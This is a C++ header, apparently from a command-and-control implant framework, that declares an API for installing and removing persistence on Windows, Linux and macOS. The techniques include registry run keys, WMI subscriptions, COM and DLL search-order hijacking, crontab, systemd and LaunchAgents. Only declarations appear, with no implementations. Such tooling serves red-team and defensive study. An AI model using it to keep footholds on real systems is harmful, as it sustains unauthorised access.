#pragma once
#include <string>
#include <vector>
#include <cstdint>

namespace rtlc2 {
namespace persistence {

// Persistence technique identifiers
// Windows: 0-19, Linux: 20-29, macOS: 30-39
enum class Technique : int {
    RegistryRunKey       = 0,
    ScheduledTask        = 1,
    WMISubscription      = 2,
    ServiceInstall       = 3,
    StartupFolder        = 4,
    COMHijack            = 5,
    DLLSearchOrder       = 6,
    RegistryLogonScript  = 7,

    Crontab              = 20,
    SystemdService       = 21,
    BashRC               = 22,

    LaunchAgent          = 30,
    LaunchDaemon         = 31,
};

// Configuration for installing/removing persistence
struct PersistConfig {
    Technique technique;
    std::string name;          // Friendly name / registry value / service name
    std::string payload_path;  // Path to the payload binary or DLL
    std::string args;          // Additional arguments for the payload
    bool hklm = false;         // Windows: HKLM (true) vs HKCU (false)
};

// Result from an install/remove operation
struct PersistResult {
    bool success;
    std::string message;
    Technique technique;
};

// ---- Cross-platform API ----

// Install persistence using the specified technique
PersistResult Install(const PersistConfig& cfg);

// Remove previously installed persistence
PersistResult Remove(const PersistConfig& cfg);

// List all currently active persistence mechanisms (best-effort detection)
std::string ListInstalled();

// ---- Platform-specific install/remove (defined in persistence_win.cpp / persistence_posix.cpp) ----

#ifdef RTLC2_WINDOWS
PersistResult InstallRegistryRunKey(const PersistConfig& cfg);
PersistResult RemoveRegistryRunKey(const PersistConfig& cfg);

PersistResult InstallScheduledTask(const PersistConfig& cfg);
PersistResult RemoveScheduledTask(const PersistConfig& cfg);

PersistResult InstallWMISubscription(const PersistConfig& cfg);
PersistResult RemoveWMISubscription(const PersistConfig& cfg);

PersistResult InstallService(const PersistConfig& cfg);
PersistResult RemoveService(const PersistConfig& cfg);

PersistResult InstallStartupFolder(const PersistConfig& cfg);
PersistResult RemoveStartupFolder(const PersistConfig& cfg);

PersistResult InstallCOMHijack(const PersistConfig& cfg);
PersistResult RemoveCOMHijack(const PersistConfig& cfg);

PersistResult InstallDLLSearchOrder(const PersistConfig& cfg);
PersistResult RemoveDLLSearchOrder(const PersistConfig& cfg);

PersistResult InstallRegistryLogonScript(const PersistConfig& cfg);
PersistResult RemoveRegistryLogonScript(const PersistConfig& cfg);
#endif

#if defined(RTLC2_LINUX) || defined(RTLC2_MACOS)
PersistResult InstallCrontab(const PersistConfig& cfg);
PersistResult RemoveCrontab(const PersistConfig& cfg);

PersistResult InstallBashRC(const PersistConfig& cfg);
PersistResult RemoveBashRC(const PersistConfig& cfg);
#endif

#ifdef RTLC2_LINUX
PersistResult InstallSystemdService(const PersistConfig& cfg);
PersistResult RemoveSystemdService(const PersistConfig& cfg);
#endif

#ifdef RTLC2_MACOS
PersistResult InstallLaunchAgent(const PersistConfig& cfg);
PersistResult RemoveLaunchAgent(const PersistConfig& cfg);

PersistResult InstallLaunchDaemon(const PersistConfig& cfg);
PersistResult RemoveLaunchDaemon(const PersistConfig& cfg);
#endif

} // namespace persistence
} // namespace rtlc2
